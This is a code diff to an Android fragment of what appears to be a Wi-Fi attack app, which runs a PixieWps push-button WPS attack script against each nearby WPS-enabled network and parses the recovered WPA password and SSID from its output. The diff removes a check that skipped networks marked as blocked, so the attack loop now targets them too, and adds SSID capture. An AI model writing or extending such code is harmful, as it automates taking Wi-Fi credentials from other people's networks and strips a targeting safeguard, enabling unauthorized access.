@@ -861,7 +861,7 @@ public class Wifi extends Fragment {
 
             for (WiFINetwork temp : list) {
                 if (cancelAttack.get()) break;
-                if (!temp.getWps() || temp.isBlocked || tried.contains(temp.getMac())) continue;
+                if (!temp.getWps() || tried.contains(temp.getMac())) continue;
 
                 final int[] time = {90}; // PBC needs more time
                 try { timer[0].cancel(); } catch (Exception ignored) {}
@@ -883,8 +883,8 @@ public class Wifi extends Fragment {
                 monitor.metric(AttackMetric.TARGET, temp.getSsid());
                 monitor.stage(AttackStage.ASSOC, AttackStage.State.ACTIVE);
 
-                // Use --pbc flag to simulate WPS push-button event
-                String cmd = " python3 -u /CORE/PixieWps/pixie.py -i " + core.getWPSInterface()
+                // Use --pbc flag with target MAC to connect to WPS push button
+                String cmd = "python3 -u /CORE/PixieWps/pixie.py -i " + core.getWPSInterface()
                         + core.wpsIfaceDownFlag() + " --pbc -b " + temp.getMac();
                 pbc[0] = new AdvancedProcess(activity, context, cmd, true) {
                     @Override
@@ -1285,6 +1285,10 @@ public class Wifi extends Fragment {
                 pass = s.replace("[+] WPA PSK: ", "").replaceAll("'", "");
                 back.setPsk(pass);
                 back.setOK(true);
+            }
+            if (s.contains("[+] AP SSID:")) {
+                String ss = s.replace("[+] AP SSID: ", "").replaceAll("'", "").trim();
+                back.setSsid(ss);
             }
         }
         return back;
